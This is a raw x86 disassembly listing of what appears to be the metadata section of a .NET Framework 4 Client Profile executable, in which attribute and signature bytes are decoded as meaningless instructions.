  40c97b:	60                   	pusha
  40c97c:	05 20 01 12 60       	add    $0x60120120,%eax
  40c981:	0e                   	push   %cs
  40c982:	05 20 01 12 60       	add    $0x60120120,%eax
  40c987:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c98d:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c992:	60                   	pusha
  40c993:	08 03                	or     %al,(%ebx)
  40c995:	20 00                	and    %al,(%eax)
  40c997:	08 05 28 01 12 60    	or     %al,0x60120128
  40c99d:	08 03                	or     %al,(%ebx)
  40c99f:	28 00                	sub    %al,(%eax)
  40c9a1:	08 03                	or     %al,(%ebx)
  40c9a3:	06                   	push   %es
  40c9a4:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c9a8:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c9ac:	01 08                	add    %ecx,(%eax)
  40c9ae:	0e                   	push   %cs
  40c9af:	05 20 01 01 12       	add    $0x12010120,%eax
  40c9b4:	61                   	popa
  40c9b5:	04 20                	add    $0x20,%al
  40c9b7:	01 01                	add    %eax,(%ecx)
  40c9b9:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c9bc:	01 01                	add    %eax,(%ecx)
  40c9be:	0b 03                	or     (%ebx),%eax
  40c9c0:	20 00                	and    %al,(%eax)
  40c9c2:	0b 03                	or     (%ebx),%eax
  40c9c4:	20 00                	and    %al,(%eax)
  40c9c6:	0a 03                	or     (%ebx),%al
  40c9c8:	20 00                	and    %al,(%eax)
  40c9ca:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c9cf:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c9d4:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c9d9:	01 0e                	add    %ecx,(%esi)
  40c9db:	0e                   	push   %cs
  40c9dc:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c9e1:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c9e4:	01 02                	add    %eax,(%edx)
  40c9e6:	0e                   	push   %cs
  40c9e7:	03 20                	add    (%eax),%esp
  40c9e9:	00 0e                	add    %cl,(%esi)
  40c9eb:	04 20                	add    $0x20,%al
  40c9ed:	01 01                	add    %eax,(%ecx)
  40c9ef:	02 04 20             	add    (%eax,%eiz,1),%al
  40c9f2:	01 01                	add    %eax,(%ecx)
  40c9f4:	0c 04                	or     $0x4,%al
  40c9f6:	20 01                	and    %al,(%ecx)
  40c9f8:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c9fe:	5c                   	pop    %esp
  40c9ff:	04 20                	add    $0x20,%al
  40ca01:	00 11                	add    %dl,(%ecx)
  40ca03:	64 04 20             	fs add $0x20,%al
  40ca06:	00 12                	add    %dl,(%edx)
  40ca08:	59                   	pop    %ecx
  40ca09:	03 28                	add    (%eax),%ebp
  40ca0b:	00 0e                	add    %cl,(%esi)
  40ca0d:	03 28                	add    (%eax),%ebp
  40ca0f:	00 0a                	add    %cl,(%edx)
  40ca11:	03 28                	add    (%eax),%ebp
  40ca13:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40ca19:	5c                   	pop    %esp
  40ca1a:	04 28                	add    $0x28,%al
  40ca1c:	00 11                	add    %dl,(%ecx)
  40ca1e:	64 04 00             	fs add $0x0,%al
  40ca21:	00 00                	add    %al,(%eax)
  40ca23:	00 04 03             	add    %al,(%ebx,%eax,1)
  40ca26:	00 00                	add    %al,(%eax)
  40ca28:	00 04 04             	add    %al,(%esp,%eax,1)
  40ca2b:	00 00                	add    %al,(%eax)
  40ca2d:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40ca34:	06                   	push   %es
  40ca35:	00 00                	add    %al,(%eax)
  40ca37:	00 04 07             	add    %al,(%edi,%eax,1)
  40ca3a:	00 00                	add    %al,(%eax)
  40ca3c:	00 04 08             	add    %al,(%eax,%ecx,1)
  40ca3f:	00 00                	add    %al,(%eax)
  40ca41:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40ca44:	00 00                	add    %al,(%eax)
  40ca46:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ca49:	00 00                	add    %al,(%eax)
  40ca4b:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40ca4e:	00 00                	add    %al,(%eax)
  40ca50:	00 06                	add    %al,(%esi)
  40ca52:	00 02                	add    %al,(%edx)
  40ca54:	0e                   	push   %cs
  40ca55:	12 61 08             	adc    0x8(%ecx),%ah
  40ca58:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40ca5d:	61                   	popa
  40ca5e:	06                   	push   %es
  40ca5f:	00 02                	add    %al,(%edx)
  40ca61:	0e                   	push   %cs
  40ca62:	05 12 61 05 00       	add    $0x56112,%eax
  40ca67:	01 01                	add    %eax,(%ecx)
  40ca69:	12 61 06             	adc    0x6(%ecx),%ah
  40ca6c:	00 02                	add    %al,(%edx)
  40ca6e:	01 12                	add    %edx,(%edx)
  40ca70:	61                   	popa
  40ca71:	0e                   	push   %cs
  40ca72:	07                   	pop    %es
  40ca73:	00 02                	add    %al,(%edx)
  40ca75:	01 12                	add    %edx,(%edx)
  40ca77:	61                   	popa
  40ca78:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40ca7d:	01 12                	add    %edx,(%edx)
  40ca7f:	61                   	popa
  40ca80:	0d 06 00 02 01       	or     $0x1020006,%eax
  40ca85:	12 61 0c             	adc    0xc(%ecx),%ah
  40ca88:	06                   	push   %es
  40ca89:	00 02                	add    %al,(%edx)
  40ca8b:	01 12                	add    %edx,(%edx)
  40ca8d:	61                   	popa
  40ca8e:	02 06                	add    (%esi),%al
  40ca90:	00 02                	add    %al,(%edx)
  40ca92:	01 12                	add    %edx,(%edx)
  40ca94:	61                   	popa
  40ca95:	0b 06                	or     (%esi),%eax
  40ca97:	00 02                	add    %al,(%edx)
  40ca99:	01 12                	add    %edx,(%edx)
  40ca9b:	61                   	popa
  40ca9c:	0a 03                	or     (%ebx),%al
  40ca9e:	06                   	push   %es
  40ca9f:	11 78 04             	adc    %edi,0x4(%eax)
  40caa2:	20 01                	and    %al,(%ecx)
  40caa4:	01 08                	add    %ecx,(%eax)
  40caa6:	08 01                	or     %al,(%ecx)
  40caa8:	00 08                	add    %cl,(%eax)
  40caaa:	00 00                	add    %al,(%eax)
  40caac:	00 00                	add    %al,(%eax)
  40caae:	00 1e                	add    %bl,(%esi)
  40cab0:	01 00                	add    %eax,(%eax)
  40cab2:	01 00                	add    %eax,(%eax)
  40cab4:	54                   	push   %esp
  40cab5:	02 16                	add    (%esi),%dl
  40cab7:	57                   	push   %edi
  40cab8:	72 61                	jb     0x40cb1b
  40caba:	70 4e                	jo     0x40cb0a
  40cabc:	6f                   	outsl  %ds:(%esi),(%dx)
  40cabd:	6e                   	outsb  %ds:(%esi),(%dx)
  40cabe:	45                   	inc    %ebp
  40cabf:	78 63                	js     0x40cb24
  40cac1:	65 70 74             	gs jo  0x40cb38
  40cac4:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40cacb:	77 73                	ja     0x40cb40
  40cacd:	01 05 20 01 01 11    	add    %eax,0x11010120
  40cad3:	71 08                	jno    0x40cadd
  40cad5:	01 00                	add    %eax,(%eax)
  40cad7:	02 00                	add    (%eax),%al
  40cad9:	00 00                	add    %al,(%eax)
  40cadb:	00 00                	add    %al,(%eax)
  40cadd:	05 01 00 00 00       	add    $0x1,%eax
  40cae2:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40cae5:	00 07                	add    %al,(%edi)
  40cae7:	31 2e                	xor    %ebp,(%esi)
  40cae9:	30 2e                	xor    %ch,(%esi)
  40caeb:	30 2e                	xor    %ch,(%esi)
  40caed:	30 00                	xor    %al,(%eax)
  40caef:	00 65 01             	add    %ah,0x1(%ebp)
  40caf2:	00 29                	add    %ch,(%ecx)
  40caf4:	2e 4e                	cs dec %esi
  40caf6:	45                   	inc    %ebp
  40caf7:	54                   	push   %esp
  40caf8:	46                   	inc    %esi
  40caf9:	72 61                	jb     0x40cb5c
  40cafb:	6d                   	insl   (%dx),%es:(%edi)
  40cafc:	65 77 6f             	gs ja  0x40cb6e
  40caff:	72 6b                	jb     0x40cb6c
  40cb01:	2c 56                	sub    $0x56,%al
  40cb03:	65 72 73             	gs jb  0x40cb79
  40cb06:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40cb0d:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40cb10:	72 6f                	jb     0x40cb81
  40cb12:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40cb19:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40cb20:	0e                   	push   %cs
  40cb21:	14 46                	adc    $0x46,%al
  40cb23:	72 61                	jb     0x40cb86
  40cb25:	6d                   	insl   (%dx),%es:(%edi)
  40cb26:	65 77 6f             	gs ja  0x40cb98
  40cb29:	72 6b                	jb     0x40cb96
  40cb2b:	44                   	inc    %esp
  40cb2c:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40cb33:	61                   	popa
  40cb34:	6d                   	insl   (%dx),%es:(%edi)
  40cb35:	65 1f                	gs pop %ds
  40cb37:	2e 4e                	cs dec %esi
  40cb39:	45                   	inc    %ebp
  40cb3a:	54                   	push   %esp
  40cb3b:	20 46 72             	and    %al,0x72(%esi)
  40cb3e:	61                   	popa
  40cb3f:	6d                   	insl   (%dx),%es:(%edi)
  40cb40:	65 77 6f             	gs ja  0x40cbb2
  40cb43:	72 6b                	jb     0x40cbb0
  40cb45:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40cb48:	43                   	inc    %ebx
  40cb49:	6c                   	insb   (%dx),%es:(%edi)
  40cb4a:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40cb51:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb52:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40cb59:	04 49                	add    $0x49,%al
  40cb5b:	74 65                	je     0x40cbc2
  40cb5d:	6d                   	insl   (%dx),%es:(%edi)
  40cb5e:	00 00                	add    %al,(%eax)
  40cb60:	03 07                	add    (%edi),%eax
  40cb62:	01 08                	add    %ecx,(%eax)
  40cb64:	04 00                	add    $0x0,%al
  40cb66:	01 08                	add    %ecx,(%eax)
  40cb68:	0e                   	push   %cs
  40cb69:	03 07                	add    (%edi),%eax
  40cb6b:	01 02                	add    %eax,(%edx)
  40cb6d:	05 00 00 12 80       	add    $0x80120000,%eax
  40cb72:	b1 05                	mov    $0x5,%cl
  40cb74:	20 01                	and    %al,(%ecx)
  40cb76:	0e                   	push   %cs
  40cb77:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cb7c:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40cb82:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cb88:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cb8d:	03 02                	add    (%edx),%eax
  40cb8f:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cb94:	14 07                	adc    $0x7,%al
  40cb96:	08 0e                	or     %cl,(%esi)
  40cb98:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cb9e:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40cba4:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40cbaa:	20 03                	and    %al,(%ebx)
  40cbac:	01 11                	add    %edx,(%ecx)
  40cbae:	80 d5 11             	adc    $0x11,%ch
  40cbb1:	80 d9 11             	sbb    $0x11,%cl
  40cbb4:	80 dd 05             	sbb    $0x5,%ch
  40cbb7:	00 02                	add    %al,(%edx)
  40cbb9:	02 0e                	add    (%esi),%cl
  40cbbb:	0e                   	push   %cs
  40cbbc:	06                   	push   %es
  40cbbd:	20 01                	and    %al,(%ecx)
  40cbbf:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cbc4:	20 01                	and    %al,(%ecx)
  40cbc6:	08 08                	or     %cl,(%eax)
  40cbc8:	07                   	pop    %es
  40cbc9:	00 01                	add    %al,(%ecx)
  40cbcb:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cbd0:	07                   	pop    %es
  40cbd1:	20 02                	and    %al,(%edx)
  40cbd3:	01 12                	add    %edx,(%edx)
  40cbd5:	80 c9 08             	or     $0x8,%cl
  40cbd8:	06                   	push   %es
  40cbd9:	20 01                	and    %al,(%ecx)
  40cbdb:	01 12                	add    %edx,(%edx)
  40cbdd:	80 f1 09             	xor    $0x9,%cl
  40cbe0:	20 02                	and    %al,(%edx)
  40cbe2:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cbe7:	80 f5 05             	xor    $0x5,%ch
  40cbea:	20 02                	and    %al,(%edx)
  40cbec:	08 08                	or     %cl,(%eax)
  40cbee:	08 06                	or     %al,(%esi)
  40cbf0:	20 02                	and    %al,(%edx)
  40cbf2:	01 12                	add    %edx,(%edx)
  40cbf4:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cbf9:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cbfc:	09 20                	or     %esp,(%eax)
  40cbfe:	03 01                	add    (%ecx),%eax
  40cc00:	12 61 02             	adc    0x2(%ecx),%ah
  40cc03:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40cc09:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40cc0f:	01 0e                	add    %ecx,(%esi)
  40cc11:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40cc17:	02 09                	add    (%ecx),%cl
  40cc19:	20 04 01             	and    %al,(%ecx,%eax,1)
  40cc1c:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40cc22:	0c 20                	or     $0x20,%al
  40cc24:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cc29:	08 08                	or     %cl,(%eax)
  40cc2b:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40cc31:	01 11                	add    %edx,(%ecx)
  40cc33:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40cc39:	02 12                	add    (%edx),%dl
  40cc3b:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cc3e:	02 08                	add    (%eax),%cl
  40cc40:	08 05 20 01 08 12    	or     %al,0x12080120
  40cc46:	25 06 00 02 08       	and    $0x8020006,%eax
  40cc4b:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40cc50:	03 08                	add    (%eax),%ecx
  40cc52:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40cc57:	20 01                	and    %al,(%ecx)
  40cc59:	01 12                	add    %edx,(%edx)
  40cc5b:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cc61:	1c 0c                	sbb    $0xc,%al
  40cc63:	07                   	pop    %es
  40cc64:	06                   	push   %es
  40cc65:	1c 02                	sbb    $0x2,%al
  40cc67:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cc6c:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cc72:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cc75:	02 07                	add    (%edi),%al
  40cc77:	20 02                	and    %al,(%edx)
  40cc79:	02 08                	add    (%eax),%cl
  40cc7b:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cc81:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40cc87:	07                   	pop    %es
  40cc88:	0a 12                	or     (%edx),%dl
  40cc8a:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40cc91:	08 12 81 
  40cc94:	41                   	inc    %ecx
  40cc95:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40cc9b:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40cca0:	4d                   	dec    %ebp
  40cca1:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cca6:	0e                   	push   %cs
  40cca7:	05 00 00 12 81       	add    $0x81120000,%eax
  40ccac:	41                   	inc    %ecx
  40ccad:	05 20 00 12 81       	add    $0x81120020,%eax
  40ccb2:	55                   	push   %ebp
  40ccb3:	06                   	push   %es
  40ccb4:	00 00                	add    %al,(%eax)
  40ccb6:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40ccbb:	00 01                	add    %al,(%ecx)
  40ccbd:	0e                   	push   %cs
  40ccbe:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40ccc3:	01 11                	add    %edx,(%ecx)
  40ccc5:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40cccc:	41                   	inc    %ecx
  40cccd:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40ccd3:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40ccda:	49                   	dec    %ecx
  40ccdb:	0e                   	push   %cs
  40ccdc:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40cce2:	0e                   	push   %cs
  40cce3:	0e                   	push   %cs
  40cce4:	0e                   	push   %cs
  40cce5:	0e                   	push   %cs
  40cce6:	05 20 02 01 0e       	add    $0xe010220,%eax
  40cceb:	1c 07                	sbb    $0x7,%al
  40cced:	20 02                	and    %al,(%edx)
  40ccef:	01 0e                	add    %ecx,(%esi)
  40ccf1:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40ccf7:	0a 02                	or     (%edx),%al
  40ccf9:	10 07                	adc    %al,(%edi)
  40ccfb:	06                   	push   %es
  40ccfc:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40cd02:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40cd08:	0e                   	push   %cs
  40cd09:	02 05 20 00 12 81    	add    0x81120020,%al
  40cd0f:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40cd15:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40cd1b:	91                   	xchg   %eax,%ecx
  40cd1c:	04 20                	add    $0x20,%al
  40cd1e:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cd21:	04 07                	add    $0x7,%al
  40cd23:	02 02                	add    (%edx),%al
  40cd25:	02 03                	add    (%ebx),%al
  40cd27:	20 00                	and    %al,(%eax)
  40cd29:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40cd2c:	02 18                	add    (%eax),%bl
  40cd2e:	02 03                	add    (%ebx),%al
  40cd30:	07                   	pop    %es
  40cd31:	01 0e                	add    %ecx,(%esi)
  40cd33:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd38:	9d                   	popf
  40cd39:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cd3e:	1c 0a                	sbb    $0xa,%al
  40cd40:	07                   	pop    %es
  40cd41:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cd46:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cd4b:	20 01                	and    %al,(%ecx)
  40cd4d:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cd53:	0e                   	push   %cs
  40cd54:	08 08                	or     %cl,(%eax)
  40cd56:	06                   	push   %es
  40cd57:	07                   	pop    %es
  40cd58:	02 02                	add    (%edx),%al
  40cd5a:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40cd60:	0e                   	push   %cs
  40cd61:	0e                   	push   %cs
  40cd62:	0e                   	push   %cs
  40cd63:	05 20 00 11 81       	add    $0x81110020,%eax
  40cd68:	ad                   	lods   %ds:(%esi),%eax
  40cd69:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd6e:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40cd73:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40cd79:	02 11                	add    (%ecx),%dl
  40cd7b:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40cd81:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40cd88:	12 81 8d 
  40cd8b:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40cd91:	12 41 01             	adc    0x1(%ecx),%al
  40cd94:	0e                   	push   %cs
  40cd95:	05 20 01 01 13       	add    $0x13010120,%eax
  40cd9a:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40cda0:	00 06                	add    %al,(%esi)
  40cda2:	00 02                	add    %al,(%edx)
  40cda4:	0e                   	push   %cs
  40cda5:	0e                   	push   %cs
  40cda6:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cdab:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40cdb0:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40cdb6:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40cdbc:	c5 09                	lds    (%ecx),%ecx
  40cdbe:	00 02                	add    %al,(%edx)
  40cdc0:	02 11                	add    (%ecx),%dl
  40cdc2:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40cdc8:	07                   	pop    %es
  40cdc9:	02 12                	add    (%edx),%dl
  40cdcb:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40cdd0:	01 02                	add    %eax,(%edx)
  40cdd2:	0e                   	push   %cs
  40cdd3:	10 02                	adc    %al,(%edx)
  40cdd5:	06                   	push   %es
  40cdd6:	00 01                	add    %al,(%ecx)
  40cdd8:	01 12                	add    %edx,(%edx)
  40cdda:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40cde0:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40cde7:	0e                   	push   %cs
  40cde8:	1c 11                	sbb    $0x11,%al
  40cdea:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40cdf0:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40cdf7:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40cdfd:	05 07 20 02 12       	add    $0x12022007,%eax
  40ce02:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40ce09:	12 60 0e             	adc    0xe(%eax),%ah
  40ce0c:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce11:	12 60 12             	adc    0x12(%eax),%ah
  40ce14:	60                   	pusha
  40ce15:	06                   	push   %es
  40ce16:	15 12 41 01 12       	adc    $0x12014112,%eax
  40ce1b:	60                   	pusha
  40ce1c:	10 10                	adc    %dl,(%eax)
  40ce1e:	01 01                	add    %eax,(%ecx)
  40ce20:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40ce25:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40ce2b:	1e                   	push   %ds
  40ce2c:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ce2f:	01 12                	add    %edx,(%edx)
  40ce31:	60                   	pusha
  40ce32:	09 20                	or     %esp,(%eax)
  40ce34:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40ce3a:	13 00                	adc    (%eax),%eax
  40ce3c:	07                   	pop    %es
  40ce3d:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce42:	12 60 04             	adc    0x4(%eax),%ah
  40ce45:	20 00                	and    %al,(%eax)
  40ce47:	13 00                	adc    (%eax),%eax
  40ce49:	05 20 01 02 13       	add    $0x13020120,%eax
  40ce4e:	00 03                	add    %al,(%ebx)
  40ce50:	07                   	pop    %es
  40ce51:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40ce58:	e5 07                	in     $0x7,%eax
  40ce5a:	20 01                	and    %al,(%ecx)
  40ce5c:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40ce62:	20 01                	and    %al,(%ecx)
  40ce64:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40ce6a:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40ce6d:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40ce73:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40ce79:	00 02                	add    %al,(%edx)
  40ce7b:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40ce81:	0e                   	push   %cs
  40ce82:	1c 00                	sbb    $0x0,%al
  40ce84:	05 12 82 05 11       	add    $0x11058212,%eax
  40ce89:	82 09 0e             	orb    $0xe,(%ecx)
  40ce8c:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce91:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40ce97:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce9c:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40cea2:	45                   	inc    %ebp
  40cea3:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40cea9:	4d                   	dec    %ebp
  40ceaa:	1c 12                	sbb    $0x12,%al
  40ceac:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ceb1:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ceb6:	0e                   	push   %cs
  40ceb7:	0b 00                	or     (%eax),%eax
  40ceb9:	01 15 12 45 01 13    	add    %edx,0x13014512
  40cebf:	00 12                	add    %dl,(%edx)
  40cec1:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40cec8:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40cecd:	4d                   	dec    %ebp
  40cece:	1c 12                	sbb    $0x12,%al
  40ced0:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ced5:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ceda:	0e                   	push   %cs
  40cedb:	17                   	pop    %ss
  40cedc:	20 0a                	and    %cl,(%edx)
  40cede:	01 13                	add    %edx,(%ebx)
  40cee0:	00 13                	add    %dl,(%ebx)
  40cee2:	01 13                	add    %edx,(%ebx)
  40cee4:	02 13                	add    (%ebx),%dl
  40cee6:	03 13                	add    (%ebx),%edx
  40cee8:	04 13                	add    $0x13,%al
  40ceea:	05 13 06 13 07       	add    $0x7130613,%eax
  40ceef:	13 08                	adc    (%eax),%ecx
  40cef1:	13 09                	adc    (%ecx),%ecx
  40cef3:	05 07 01 12 82       	add    $0x82120107,%eax
  40cef8:	0d 07 20 03 01       	or     $0x1032007,%eax
  40cefd:	0e                   	push   %cs
  40cefe:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cf03:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40cf09:	06                   	push   %es
  40cf0a:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40cf10:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40cf16:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40cf1b:	20 01                	and    %al,(%ecx)
  40cf1d:	01 11                	add    %edx,(%ecx)
  40cf1f:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40cf26:	82 31 05             	xorb   $0x5,(%ecx)
  40cf29:	20 00                	and    %al,(%eax)
  40cf2b:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40cf31:	01 12                	add    %edx,(%edx)
  40cf33:	61                   	popa
  40cf34:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40cf3a:	08 20                	or     %ah,(%eax)
  40cf3c:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cf42:	08 1a                	or     %bl,(%edx)
  40cf44:	07                   	pop    %es
  40cf45:	0a 12                	or     (%edx),%dl
  40cf47:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40cf4e:	21 1d 05 
  40cf51:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cf56:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40cf5d:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cf62:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40cf68:	45                   	inc    %ebp
  40cf69:	08 08                	or     %cl,(%eax)
  40cf6b:	04 07                	add    $0x7,%al
  40cf6d:	02 02                	add    (%edx),%al
  40cf6f:	08 09                	or     %cl,(%ecx)
  40cf71:	00 02                	add    %al,(%edx)
  40cf73:	01 12                	add    %edx,(%edx)
  40cf75:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40cf79:	4d                   	dec    %ebp
  40cf7a:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40cf7f:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40cf85:	05 08 05 07 07       	add    $0x7070508,%eax
  40cf8a:	02 12                	add    (%edx),%dl
  40cf8c:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40cf90:	08 07                	or     %al,(%edi)
  40cf92:	04 12                	add    $0x12,%al
  40cf94:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40cf99:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cf9e:	1c 06                	sbb    $0x6,%al
  40cfa0:	07                   	pop    %es
  40cfa1:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40cfa7:	20 01                	and    %al,(%ecx)
  40cfa9:	13 00                	adc    (%eax),%eax
  40cfab:	08 04 07             	or     %al,(%edi,%eax,1)
  40cfae:	01 12                	add    %edx,(%edx)
  40cfb0:	60                   	pusha
  40cfb1:	0e                   	push   %cs
  40cfb2:	07                   	pop    %es
  40cfb3:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40cfb8:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40cfbe:	12 60 07             	adc    0x7(%eax),%ah
  40cfc1:	07                   	pop    %es
  40cfc2:	04 08                	add    $0x8,%al
  40cfc4:	05 1d 05 08 04       	add    $0x408051d,%eax
  40cfc9:	20 01                	and    %al,(%ecx)
